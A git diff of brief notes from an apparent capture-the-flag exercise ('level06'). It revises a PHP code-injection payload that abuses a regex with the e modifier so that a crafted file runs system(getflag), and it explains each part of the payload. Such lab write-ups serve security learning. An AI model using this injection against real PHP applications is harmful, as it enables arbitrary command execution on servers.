@@ -23,8 +23,10 @@
 * try 4 : in level06.php
     * l10 : cette ligne est la plus interessante, il faudrait trouver une regex reverse qui une fois passee dans cette commande lance getflag
 * try 5 :
-    * ``echo "[x \${ system(getflag) }]" > /tmp/exploit06``
-        * ``system`` is a php cmd to execute bash cmd
-        * we wanted ``${system(getflag) }`` in y
-        * we added ``x \`` to be take in count by l10 and put in ``[]`` to had ``()`` 
-    * ``./level06 /tmp/exploit06``
+    * ``echo "[x {\${system(getflag)}}]">/tmp/bouh``
+        * We need to execute ``systeme(getflag)``
+        * So we use ``${}`` to indicate to PHP that there is a variable -> ``${system(getflag)}``
+        * we add ``\`` in order to avoid ``-bash: [x {${system(getflag)}}]: bad substitution`` -> ``\${system(getflag)}``
+        * we add another ``{}`` to tell PHP that there is something to calculate inside -> ``{\${system(getflag)}}``
+        * we add ``[x ]`` to make the l10's regex with e modifier to work
+    * ``./level06 /tmp/bouh``
